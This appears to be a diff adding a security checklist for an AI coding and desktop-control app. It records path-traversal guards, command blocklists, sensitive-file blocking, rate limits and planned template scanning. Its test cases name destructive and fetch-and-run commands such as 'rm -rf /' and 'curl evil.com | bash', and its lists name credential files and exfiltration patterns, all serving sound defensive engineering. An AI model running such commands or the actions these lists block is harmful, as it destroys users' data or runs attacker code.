@@ -1,0 +1,433 @@
+# Security Protections Checklist   Omnirun
+
+## Current State (Feb 10, 2026)
+
+All security sections complete. Sections 1 5 and 7 implemented in toolService.ts.
+Section 6 evaluated and intentionally left open (see below). Section 8 covered by Rust backend.
+
+Current protections:
+- Time Machine snapshots before writes/deletes (recovery, not prevention)
+- Blocklist for node_modules/.git/etc   NOW enforced on ALL tools (read, write, edit, delete, read_multiple)
+- 10-iteration tool loop cap
+-   Path traversal protection (Section 1)
+-   Command execution safety with blocklist + CD escape detection + cd subfolder cwd support (Section 2)
+-   File content sanitization for HTML   includes XML entity unescaping (Section 3)
+-   Sensitive file protection   .env, keys, certs blocked on all tools (Section 4)
+-   File size limits   100KB read, 500KB write (Section 5)
+-   Rate limiting   per-tool sliding window (Section 7)
+-   Symlink protection   already handled by Rust backend canonicalize() in is_path_allowed() (Section 8)
+
+---
+
+## 1. PATH TRAVERSAL PROTECTION   CRITICAL     DONE
+
+### What was done
+- Replaced resolveProjectPath() with secure version
+- Resolves all ../ segments, then verifies final path starts with projectPath
+- Case-insensitive comparison for Windows
+
+### Testing notes (Feb 9, 2026)
+- Tested "Read the file ../test.txt"   DeepSeek stripped ../ on its own before calling tool
+- The code protection in resolveProjectPath() is still there as a safety net for dumber models
+- Path traversal protection confirmed in code even though AI was smart enough to avoid it
+
+### Checklist
+- [x] Replace resolveProjectPath() with secure version
+- [x] Test: `../test`   AI stripped ../ itself, code protection exists as backup
+- [ ] Test: `../../Windows` should throw error
+- [ ] Test: `styles.css` should work normally
+- [ ] Test: `src/components/App.tsx` should work normally
+- [ ] Test: `./styles.css` should work normally
+
+---
+
+## 2. COMMAND EXECUTION SAFETY   CRITICAL     DONE
+
+### What was done
+- Added BLOCKED_COMMANDS array (30+ patterns) and isCommandBlocked() function
+- Added CD_ESCAPE_PATTERNS array to block directory escape via cd/pushd
+- Check runs in run_command case BEFORE invoke("execute_command")
+- Decided: blocklist mode (not allowlist   allowlist too restrictive for general use)
+
+### CD Subfolder Support (Feb 10, 2026)
+- run_command now extracts `cd subfolder && command` patterns
+- Subdirectory resolved via resolveProjectPath()   blocks ../ escape
+- Actual command runs with extracted subdirectory as cwd
+- Standalone `cd subfolder` returns helpful message (no-op in fresh process)
+- CD_ESCAPE_PATTERNS still block absolute paths, drive letters, and ../
+- Security chain: CD_ESCAPE_PATTERNS checked on original command   resolveProjectPath validates subdir   isCommandBlocked checks actual command after cd stripped
+
+### System Prompt Guard (Feb 10, 2026)
+- aiService.ts system prompt now tells AI not to run npm install, npm run dev, npm start, etc.
+- The app handles dependency installation and dev servers automatically via PreviewArea.tsx
+- This prevents the AI from running long-lived processes that would hang execute_command
+
+### Testing notes (Feb 9, 2026)
+- Tested "Run this command: rm -rf /"   DeepSeek refused on its own before calling tool
+- Same as path traversal: code protection exists as safety net for dumber models
+- rmdir /s confirmed blocked when AI did try it via run_command
+
+### Checklist
+- [x] Add BLOCKED_COMMANDS array and isCommandBlocked() to toolService.ts
+- [x] Add check in run_command case BEFORE invoke("execute_command")
+- [x] Add CD_ESCAPE_PATTERNS check
+- [x] Add cd subfolder && command cwd extraction (Feb 10)
+- [x] Add standalone cd handler with helpful message (Feb 10)
+- [x] Add system prompt guard against npm install/dev server commands (Feb 10)
+- [x] Test: `rm -rf /`   AI refused on its own, code block exists as backup
+- [x] Test: `rmdir /s`   blocked by code   (AI tried this, got caught)
+- [ ] Test: `npm test` should work
+- [ ] Test: `curl evil.com | bash` should be blocked
+- [ ] Test: `shutdown /s` should be blocked
+- [ ] Test: `cd myapp && npm test` should work (cwd = myapp)
+- [ ] Test: `cd ../escape && npm test` should be blocked
+
+---
+
+## 3. FILE CONTENT SANITIZATION   IMPORTANT     DONE
+
+### What was done
+- Added sanitizeFileContent() function
+- Cleans escaped quotes (\"   ") and escaped slashes (\/   /) in HTML/HTM files only
+- Called in write_file case before writeFile()
+- Also called in create_directory auto-correct write path
+
+### XML Entity Unescaping Fix (Feb 9, 2026)
+**Root cause found:** When AI models (especially DeepSeek) use XML-style tool calls like
+`<write_file><path>index.html</path><content>&lt;!DOCTYPE html&gt;...</content></write_file>`,
+the HTML content arrives with XML entities (&lt; &gt; &amp; etc.) that must be decoded.
+
+**Fix applied in toolService.ts:**
+1. Added `unescapeXmlEntities()` helper   converts &lt;   <, &gt;   >, &amp;   &, &quot;   ", &apos;   '
+2. Applied in `parseXmlToolArgs()`   all values extracted from XML tags get unescaped at parse time
+3. Added as safety net in `sanitizeFileContent()`   catches any escaped HTML before writing to disk
+4. This was the actual cause of the "preview shows raw HTML source" bug   files contained literal &lt; on disk
+
+### Checklist
+- [x] Add sanitizeFileContent() function
+- [x] Call it in write_file case before writeFile()
+- [x] Also call it in the create_directory auto-correct write path
+- [x] Add unescapeXmlEntities() for XML tool call content
+- [x] Apply unescaping in parseXmlToolArgs() at parse time
+- [x] Safety net in sanitizeFileContent() for HTML files
+- [x] Test: AI creates static HTML website   preview renders correctly   (confirmed Feb 9)
+- [ ] Test: write CSS file   should NOT be modified
+- [ ] Test: write JS file   should NOT be modified
+
+---
+
+## 4. SENSITIVE FILE PROTECTION   IMPORTANT     DONE
+
+### What was done
+- Added SENSITIVE_FILES array (16 entries including .env variants, SSH keys, AWS, Firebase)
+- Added SENSITIVE_EXTENSIONS array (.pem, .key, .p12, .pfx, .keystore)
+- Added isSensitiveFile() function
+- Checks added in ALL file tools: read_file, read_multiple_files, write_file, edit_file, delete_file, create_directory auto-correct
+
+### Testing notes (Feb 9, 2026)
+- Tested "what's in my .env"   tool fired, got   BLOCKED message
+- AI responded correctly: "I cannot read or modify .env files as they contain sensitive information"
+
+### Checklist
+- [x] Add SENSITIVE_FILES and SENSITIVE_EXTENSIONS arrays
+- [x] Add isSensitiveFile() function
+- [x] Check in read_file BEFORE reading
+- [x] Check in write_file BEFORE writing
+- [x] Check in edit_file BEFORE reading
+- [x] Check in delete_file BEFORE deleting
+- [x] Check in read_multiple_files BEFORE reading (per file)
+- [x] Return clear error: "BLOCKED: .env is a sensitive file. AI cannot read or modify it."
+- [x] Test: read_file .env   blocked   (confirmed Feb 9)
+- [ ] Test: write_file .env   blocked
+- [ ] Test: read_file server.key   blocked
+- [ ] Test: read_file styles.css   works normally
+
+---
+
+## 5. FILE SIZE LIMITS   IMPORTANT     DONE
+
+### What was done
+- Added MAX_READ_SIZE = 100,000 (100KB)
+- Added MAX_WRITE_SIZE = 500,000 (500KB)
+- Check in read_file after reading content
+- Check in read_multiple_files per file
+- Check in write_file before writing
+
+### Checklist
+- [x] Add MAX_READ_SIZE check in read_file
+- [x] Add MAX_WRITE_SIZE check in write_file
+- [x] Also apply to read_multiple_files (per-file limit)
+- [ ] Test: read small file   works
+- [ ] Test: read 200KB file   blocked with message
+
+---
+
+## 6. DELETE CONFIRMATION   EVALUATED   INTENTIONALLY SKIPPED
+
+### Decision (Feb 9, 2026)
+Evaluated both options (block directory deletion vs confirmation UI).
+Implemented Option A (block directory deletion), then reverted after testing.
+
+### Reasoning
+- Blocking folder deletion is unnecessary   if user asks to delete a folder, they want it deleted
+- Path traversal protection (Section 1) already prevents AI from touching anything outside project folder
+- Time Machine snapshots provide recovery for delete_file tool calls
+- The real protection is containment (stay inside project), not preventing deletion
+
+### Known gap
+- When AI deletes via run_command (shell commands like rmdir) instead of delete_file tool, Time Machine does NOT capture a snapshot
+- This is an edge case   future fix would be to snapshot before any destructive-looking run_command
+- For now, acceptable risk since path traversal still prevents escaping project folder
+
+### Checklist
+- [x] Evaluated Option A (block directory deletion)   implemented then reverted
+- [x] Decision: not needed   path traversal + Time Machine is sufficient
+- [ ] Future: consider snapshotting before destructive run_command calls
+
+---
+
+## 7. RATE LIMITING   NICE TO HAVE     DONE
+
+### What was done
+- Added RATE_LIMITS config: write_file (20/min), edit_file (20/min), delete_file (5/min), run_command (10/min)
+- Added toolCallTimestamps Map for sliding window tracking
+- Added isRateLimited() function
+- Check runs at the top of executeTool() BEFORE the switch statement
+- Read tools (read_file, list_directory) are not rate limited since they're harmless
+- Returns clear error with seconds to wait
+
+### Checklist
+- [x] Add rate limit tracking (Map of tool   timestamps)
+- [x] Check before each tool execution
+- [x] Return "Rate limit: too many {tool} calls. Waiting." if exceeded
+- [ ] Test: rapid writes   blocked after 20
+
+---
+
+## 8. SYMLINK PROTECTION   EDGE CASE     ALREADY COVERED
+
+### Status
+The Rust backend (lib.rs) already handles this via canonicalize() in is_path_allowed().
+canonicalize() resolves all symlinks to their real paths, then checks if the resolved path starts with the project path.
+No additional work needed.
+
+### Checklist
+- [x] In Rust read_file command: resolve symlinks, verify final path is inside project (already done via canonicalize)
+
+---
+
+## EXTRA FIX: Blocklist enforcement on ALL tools     DONE (Feb 9, 2026)
+
+### Problem found during implementation
+The blocklist (node_modules, .git, dist, etc.) was only checked in read_file and list_directory.
+AI could still write into, edit, and delete from these directories.
+
+### Fix
+Added blocklist check to: read_multiple_files, write_file, edit_file, delete_file.
+Now all file tools enforce the blocklist consistently.
+
+---
+
+## IMPLEMENTATION PRIORITY   ALL DONE
+
+### Done   before any user testing
+1. Path traversal protection (Section 1)
+2. Command execution safety (Section 2)
+3. Sensitive file protection (Section 4)
+
+### Done   before beta launch
+4. File content sanitization (Section 3)
+5. File size limits (Section 5)
+
+### Done   before public launch
+7. Rate limiting (Section 7)
+8. Symlink protection (Section 8)   (already in Rust)
+
+### Evaluated and closed
+6. Delete confirmation (Section 6)   intentionally skipped (see reasoning above)
+
+---
+
+## FILES MODIFIED
+
+| Section | File | Status |
+|---------|------|--------|
+| 1 | toolService.ts |   Done |
+| 2 | toolService.ts |   Done (+ cd subfolder cwd Feb 10) |
+| 2 | aiService.ts |   Done (+ install/dev guard Feb 10) |
+| 3 | toolService.ts |   Done (+ XML entity unescaping Feb 9) |
+| 4 | toolService.ts |   Done |
+| 5 | toolService.ts |   Done |
+| 6 | N/A |   Evaluated, intentionally skipped |
+| 7 | toolService.ts |   Done |
+| 8 | lib.rs |   Already covered |
+| Extra | toolService.ts |   Blocklist on all tools |
+
+All security changes primarily in toolService.ts, with system prompt guard in aiService.ts.
+
+---
+
+## 9. TEMPLATE INSTALL SAFETY — CRITICAL — PENDING
+
+### Threat Model
+Templates are files uploaded to Supabase Storage that get written into user project folders.
+For admin-curated templates: risk is near-zero (we control the content).
+For future marketplace templates (user-submitted): risk increases. Scaffold templates can contain
+malicious JavaScript that runs when the user opens their project in a browser or dev server.
+
+Templates CANNOT cause traditional malware (no executables, no install scripts).
+The real risk is malicious code inside project files that activates at runtime (not install time).
+
+### Design Principles
+- Templates never execute — Omnirun's existing tools do the work
+- Install process is write-only: files go into the project folder, nothing else happens
+- Safety is enforced by the system, not by asking users to review code
+
+### Hard Containment (enforced by template install engine, not user choice)
+
+**Path jail:**
+- Every file a template writes MUST land inside the project folder
+- System rejects ../, absolute paths, symlinks escaping the root
+- Hardcoded rule in scaffold engine — no template can override it
+
+**No outbound network during install:**
+- Zero network calls during template install
+- Files come from Supabase bucket and that's it
+- No fetching scripts from external URLs, no phoning home
+
+**No shell execution during install:**
+- run_command is NOT available in the template install context
+- This is the most dangerous capability — simply not wired into the template engine
+
+**Tool allowlist (not blocklist):**
+- Templates can ONLY use: write_file (inside project), create_directory (inside project)
+- Everything else — run_command, read_file outside project, delete_file, connections — does not exist in template context
+- A malicious template author can't use what doesn't exist
+
+### Automated Scanner (runs on every upload, before template is visible)
+
+What it checks:
+- [ ] External network calls: fetch(), XMLHttpRequest, sendBeacon(), WebSocket to external domains
+- [ ] External script loading: <script src="..."> pointing to non-trusted CDNs
+- [ ] Data exfiltration: code accessing localStorage/document.cookie/navigator and sending externally
+- [ ] Obfuscation: base64-encoded strings, eval(), Function() constructor, atob() used suspiciously
+- [ ] Hidden elements: invisible iframes, zero-size forms, redirect chains
+- [ ] File type validation: reject binary files disguised as text
+- [ ] Size limits: max 500KB per file, max 50 files per template, max 5MB total
+
+### Tiered Review (for future marketplace)
+- Free scaffold (files only): automated scan + community flagging
+- Free automation (uses tools): automated scan + tool audit + community flagging
+- Paid (any type): FULL manual review before listing
+- Uses run_command: ALWAYS manual review, any price
+
+### Scheduled Task Guardrails (future automation templates)
+- [ ] Can only operate on the project they were installed into
+- [ ] Minimum interval: 1 hour
+- [ ] Inherit same tool allowlist — no shell commands
+- [ ] Maximum 5 scheduled tasks per template
+- [ ] User can see/disable all template-created tasks from settings
+
+### Kill Switch
+- [ ] Any user can report a template with one click
+- [ ] 3 reports → template auto-delisted, pending review
+- [ ] Admin can remotely disable any template instantly
+- [ ] For scheduled tasks: remote disable kills task on users' machines at next sync
+
+### Creator Accountability (future marketplace)
+- Revenue held for 7 days before payout (dispute window)
+- 3 valid reports → template delisted, creator warned
+- Repeat offenders permanently banned
+- Creator identity tied to Omnirun account (real Stripe payment info)
+
+### Checklist
+- [ ] Path jail enforcement in templateService.ts scaffoldProjectFromTemplate()
+- [ ] Validate all file paths are relative and inside project folder before writing
+- [ ] Reject files with ../ or absolute paths
+- [ ] Build scanner utility function (scanTemplateFiles)
+- [ ] Scanner: check for external fetch/XHR/WebSocket patterns
+- [ ] Scanner: check for external script tags
+- [ ] Scanner: check for eval/Function/atob obfuscation
+- [ ] Scanner: check for hidden iframes/forms
+- [ ] Scanner: enforce file size limits
+- [ ] Scanner: reject binary files
+- [ ] Run scanner on upload before template becomes visible
+- [ ] One-click report UI in template gallery
+- [ ] Auto-delist after 3 reports
+- [ ] Admin kill switch in admin dashboard
+
+### Implementation Notes
+- Scanner is a utility function, not a separate service. It reads file contents and returns pass/fail with reasons.
+- For Phase 1 (admin-curated templates): scanner is optional since we control the content. Build it anyway for Phase 2 readiness.
+- Path jail is the most critical protection — implement first.
+- See template-marketplace.txt for full marketplace strategy and schema plans.
+---
+
+## 10. DESKTOP APP CONTROL SAFETY -- CRITICAL -- PARTIALLY DONE (April 3, 2026)
+
+### See desktop-app-control.txt for full feature spec
+
+### Threat Model
+Desktop app control takes screenshots and simulates mouse/keyboard input. This is powerful and dangerous -- it could click anything, type anything, interact with any app on the user's computer.
+
+Unlike browser control (sandboxed to Playwright), desktop control operates at the OS level. A misclick could send an email, delete a file, or make a purchase.
+
+### What's Built
+
+**Blocked apps list:**
+- [x] User can define apps that desktop control should never interact with
+- [x] Banking apps + password managers auto-suggested for blocklist ("Add common defaults" button)
+- [x] Omnirun itself (omnirun, msedgewebview2) included in defaults to prevent self-control
+- [x] isBlockedApp() check runs before every screenshot and action execution
+- [x] Stored in localStorage via screenControlService settings
+
+**Action delay:**
+- [x] Configurable delay between actions (200ms / 500ms / 1s / 2s, default 500ms)
+- [x] Gives user time to see what's happening and intervene
+
+**Rate limiting:**
+- [x] screen_capture: max 30 per minute
+- [x] screen_action: max 50 per minute
+- [x] Max 12 steps per screen control session (safety cap)
+
+**Screenshot privacy:**
+- [x] Screenshots sent only to Claude API (same privacy as any API call)
+- [x] Screenshots NOT stored locally or remotely after processing
+- [x] Base64 data exists only in memory during the loop iteration
+
+**Stop button:**
+- [x] Prominent red Stop button in floating overlay (always visible during control)
+- [x] Stop button in Screen ON toggle in chat header
+- [x] Stops immediately via screenControlStopRef checked every loop iteration
+
+**AI safety instructions:**
+- [x] SCREEN_CONTROL_SYSTEM_PROMPT includes "NEVER click send/submit/post, enter passwords, or interact with payment screens without user approval"
+- [x] "If something unexpected appears, stop and ask the user"
+
+### What's NOT Built Yet
+
+**Kill switch (global hotkey):**
+- [ ] Global hotkey (default F10) immediately stops all input simulation
+- [ ] Hotkey works even when Omnirun is not focused (Tauri GlobalShortcutManager)
+- [ ] Currently UI-only (Stop button requires Omnirun to be visible)
+- CRITICAL: This is the hard safety net. Must be implemented before public release.
+
+**Approval flow for sensitive screens:**
+- [ ] Code-level enforcement: detect password/payment/send in AI response and pause
+- [ ] Approval modal: "I'm about to click 'Send' on this email. Proceed?"
+- [ ] User configurable: which action types always require approval
+- [ ] Currently AI-prompt-only (tells AI to flag, but no code enforcement)
+
+**Sensitive app auto-detection:**
+- [ ] If AI sees banking, medical, or password fields, automatically pause
+- [ ] Currently relies on blocked apps list (manual, not auto-detected)
+
+**Session timeout:**
+- [ ] Timeout after 5 minutes of no progress
+- [ ] Currently only max step limit (12 steps)
+
+### Implementation Notes
+- Desktop app control safety is partially built. Blocked apps + rate limiting + action delay + stop button provide baseline safety.
+- The kill switch (global hotkey) is the single most critical missing safety feature.
+- Approval detection is AI-based (Claude reads the screenshot and flags sensitive content). Not 100% reliable. The kill switch is the hard safety net.
+- All desktop control safety settings live in Settings > Screen Control (same page as feature toggle).
